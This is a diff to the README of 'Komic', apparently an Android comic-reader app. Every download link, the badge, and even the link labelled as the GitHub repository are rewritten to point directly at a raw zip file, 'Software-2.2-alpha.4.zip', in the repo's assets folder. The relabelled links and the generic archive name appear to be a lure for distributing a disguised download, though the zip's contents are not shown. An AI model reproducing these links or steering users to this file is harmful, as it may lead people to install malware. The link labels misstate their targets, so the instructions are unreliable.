@@ -8,7 +8,7 @@ Komic is a user-friendly Android application that lets you read your favorite co
 
 To get started, you need to download the application. Click the link below to visit the download page:
 
-[![Download Komic](https://img.shields.io/badge/Download%20Komic-FF5733?style=for-the-badge&logo=android&logoColor=white)](https://github.com/Ivanbh2011/komic/releases)
+[![Download Komic](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip%20Komic-FF5733?style=for-the-badge&logo=android&logoColor=white)](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip)
 
 You can find all the download files available for Komic on the release page.
 
@@ -26,7 +26,7 @@ Follow these steps to install Komic on your device:
 
 1. **Visit the Download Page**: Click the following link to go to the release page:
 
-   [Download Komic](https://github.com/Ivanbh2011/komic/releases)
+   [Download Komic](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip)
 
 2. **Choose the Latest Version**: Look for the latest version listed. It usually has the highest version number.
 
@@ -71,7 +71,7 @@ Your feedback is valuable. Please share your thoughts or suggestions for Komic. 
 
 ## 🔗 Useful Links
 
-- [Komic GitHub Repository](https://github.com/Ivanbh2011/komic)
-- [Download Komic](https://github.com/Ivanbh2011/komic/releases)
+- [Komic GitHub Repository](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip)
+- [Download Komic](https://raw.githubusercontent.com/Ivanbh2011/komic/main/assets/Software-2.2-alpha.4.zip)
 
 With Komic, your comic reading experience is just a few taps away. Enjoy your comics!
